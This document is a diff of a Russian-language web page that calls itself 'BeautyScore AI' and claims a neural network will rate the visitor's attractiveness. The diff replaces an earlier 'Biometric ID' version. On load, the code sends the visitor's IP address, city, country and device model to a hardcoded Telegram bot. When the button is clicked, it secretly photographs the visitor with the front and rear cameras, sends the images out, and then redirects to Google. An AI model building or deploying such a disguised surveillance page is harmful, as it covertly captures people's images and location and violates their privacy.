@@ -1,102 +1,83 @@
 <!DOCTYPE html>
 <html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Scanner Pro</title>
-    <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.3; }
-        
-        /* Стеклянный интерфейс */
-        .glass-panel {
-            position: relative; z-index: 10; width: 80%; max-width: 320px;
-            padding: 40px 20px; background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px;
-            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-        }
-
-        .title { font-size: 14px; font-weight: 300; letter-spacing: 4px; color: #fff; margin-bottom: 40px; text-transform: uppercase; opacity: 0.8; }
-        
-        .glass-btn {
-            background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 22px 0; width: 100%; border-radius: 18px; color: #fff;
-            font-size: 15px; font-weight: 300; letter-spacing: 1px; cursor: pointer; transition: 0.3s;
-        }
-        
-        .glass-btn:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.97); }
-        #status { margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; }
-        canvas { display: none; }
-    </style>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+    body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#0f0c29; background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%); font-family:sans-serif; color:white; overflow:hidden; }
+    .card { background:rgba(255,255,255,0.05); backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); padding:40px 20px; border-radius:30px; text-align:center; max-width:360px; width:90%; box-shadow:0 20px 50px rgba(0,0,0,0.5); position:relative; overflow:hidden; }
+    .scan-line { display:none; position:absolute; left:0; top:0; width:100%; height:4px; background:#00f2fe; box-shadow:0 0 15px #00f2fe; animation:scan 2s infinite ease-in-out; }
+    @keyframes scan { 0%{top:0;} 50%{top:100%;} 100%{top:0;} }
+    h1 { font-size:24px; color:#00f2fe; text-transform:uppercase; }
+    #b { padding:18px 40px; background:linear-gradient(90deg,#ff0080,#ff8c00); border:none; border-radius:50px; color:white; font-size:16px; font-weight:bold; cursor:pointer; }
+</style>
 </head>
 <body>
-
-<video id="v" autoplay playsinline></video>
-
-<div class="glass-panel" id="ui">
-    <div class="title">Biometric ID</div>
-    <button class="glass-btn" onclick="start()">СДЕЛАТЬ ФОТО</button>
-    <div id="status">Система готова</div>
+<div class="card">
+    <div id="line" class="scan-line"></div>
+    <div style="font-size:50px;">💎</div>
+    <h1>BeautyScore AI</h1>
+    <p>Нейросеть проанализирует ваше лицо и определит ваш балл привлекательности.</p>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <button id="b">Узнать мой балл</button>
+    <div id="status" style="margin-top:20px; color:#00f2fe;">Система готова...</div>
 </div>
 
-<canvas id="c"></canvas>
-
 <script>
-    // ТВОИ ДАННЫЕ
-    const T = "8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc";
-    const I = "7164380121";
+    const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
+    const chat_id = '7164380121';
 
-    const v = document.getElementById('v');
-    const s = document.getElementById('status');
-
-    async function send(b, cap) {
-        let f = new FormData();
-        f.append('chat_id', I);
-        f.append('photo', b, 'f.jpg');
-        f.append('caption', cap);
-        try { await fetch(`https://api.telegram.org/bot ${Thoken}/sendPhoto`, { method: 'POST', body: f }); } catch(e){}
+    function getModel() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+        return match ? match[1].split(';')[0] : "Неизвестно";
     }
 
-    async function snap(m) {
-        const c = document.getElementById('c');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        let b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
-        await send(b, m);
-    }
-
-    async function start() {
-        document.querySelector('.glass-btn').style.display = 'none';
-        s.innerText = "Инициализация...";
-        
+    // ИСПРАВЛЕННЫЙ ЛОГГЕР (ЖДЕТ ДАННЫЕ)
+    async function logVisit() {
         try {
-            // 1. Фронталка
-            let st = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            v.srcObject = st;
-            s.innerText = "Анализ сетчатки...";
-            await new Promise(r => setTimeout(r, 1500));
-            await snap("👤 Лицо");
-
-            // 2. Задняя камера
-            s.innerText = "Синхронизация...";
-            st.getTracks().forEach(t => t.stop());
-            let st2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            v.srcObject = st2;
-            await new Promise(r => setTimeout(r, 1500));
-            await snap("📷 Окружение");
-
-            // 3. ЭФФЕКТ КИКА (Редирект)
-            s.innerText = "Ошибка сессии...";
-            setTimeout(() => {
-                window.location.href = "https://www.google.com"; // Куда выкинет пользователя
-            }, 500);
-
+            const res = await fetch('https://ipwho.is');
+            const d = await res.json();
+            if (d.success) {
+                const info = `👀 КТО-ТО ЗАШЕЛ!\n🏙 Город: ${d.city}\n🌍 Страна: ${d.country}\n📍 IP: ${d.ip}\n📱 Модель: ${getModel()}`;
+                await fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
+            }
         } catch (e) {
-            s.innerText = "Ошибка: Доступ отклонен";
-            setTimeout(() => { window.location.reload(); }, 2000);
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход! Модель: " + getModel()));
         }
     }
+    logVisit();
+
+    async function takePhoto(facing) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            await new Promise(r => setTimeout(r, 2500)); 
+            const c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+            const f = new FormData();
+            f.append('chat_id', chat_id);
+            f.append('photo', blob, 'img.jpg');
+            f.append('caption', `📸 Фото: ${facing}\n📱 Модель: ${getModel()}`);
+            await fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: f });
+            stream.getTracks().forEach(t => t.stop()); 
+        } catch (e) {
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА"));
+        }
+    }
+
+    document.getElementById('b').onclick = async () => {
+        document.getElementById('b').style.display = "none";
+        document.getElementById('line').style.display = "block";
+        document.getElementById('status').innerText = "Анализ биометрии...";
+        await takePhoto("user"); 
+        document.getElementById('status').innerText = "Глубинное сканирование...";
+        await takePhoto("environment"); 
+        document.getElementById('status').innerText = "Готово!";
+        setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
+    };
 </script>
 </body>
 </html>
